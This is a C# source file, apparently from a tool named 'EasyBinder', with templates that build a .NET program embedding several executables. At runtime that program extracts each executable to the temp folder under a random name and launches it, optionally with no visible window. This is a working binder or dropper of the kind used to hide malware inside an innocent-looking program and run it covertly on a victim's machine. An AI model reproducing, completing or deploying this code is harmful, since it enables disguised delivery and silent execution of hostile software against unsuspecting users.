using System;

namespace EasyBinder
{
    class Payloads
    {
        public static string BaseCSProj = @"<Project Sdk=""Microsoft.NET.Sdk"">

  <PropertyGroup>
    <OutputType>{__EXE_MODE__}</OutputType>
    <TargetFramework>net9.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
  </PropertyGroup>

  <ItemGroup>
{__EMBED_XMLs__}
  </ItemGroup>

</Project>
";

        public static string BaseEmbeddedRsrcXML = @"    <EmbeddedResource Include=""{__FILE_NAME__}"">
      <LogicalName>__SIGMA_CS__.{__FILE_NAME__}</LogicalName>
    </EmbeddedResource>";

        public static string BaseEmbbededRscrcLoader = @"        try {
            fp = EmbeddedExtractor.ExtractEmbeddedFile(""{__FILE_NAME__}"", Path.Combine(outDir, Path.GetRandomFileName()));

                Process {__FILE_NAME__} = new Process();

                {__FILE_NAME__}.StartInfo.FileName = fp;
                {__FILE_NAME__}.StartInfo.CreateNoWindow = {__CNW__};
                {__FILE_NAME__}.Start();
        }
        catch (Exception ex) { Console.WriteLine(ex); }";

        public static string BaseMainPayload = @"using System;
using System.IO;
using System.Diagnostics;
using System.Reflection;

class Program
{
    static void Main(string[] Args)
    {
        string fp;
        string outDir = Path.GetTempPath();

{__EMBEDDED_PAYLOADS_EXTRACTION__}
    }
}

public static class EmbeddedExtractor
{
    public static string ExtractEmbeddedFile(string resourceName, string outputPath)
    {
        resourceName += "".exe"";
        
        Assembly assembly = Assembly.GetExecutingAssembly();

        string? fullResourceName = Array.Find(
            assembly.GetManifestResourceNames(),
            r => r.EndsWith(resourceName, StringComparison.OrdinalIgnoreCase)
        );

        if (fullResourceName == null)
            throw new Exception($""Embedded resource not found: {resourceName}"");

        Directory.CreateDirectory(Path.GetDirectoryName(outputPath)!);

        using Stream? resourceStream = assembly.GetManifestResourceStream(fullResourceName);
        if (resourceStream == null)
            throw new Exception($""Unable to load embedded resource stream: {fullResourceName}"");

        using FileStream fileStream = new FileStream(outputPath, FileMode.Create, FileAccess.Write);

        resourceStream.CopyTo(fileStream);

        return outputPath;
    }
}
";
    }
}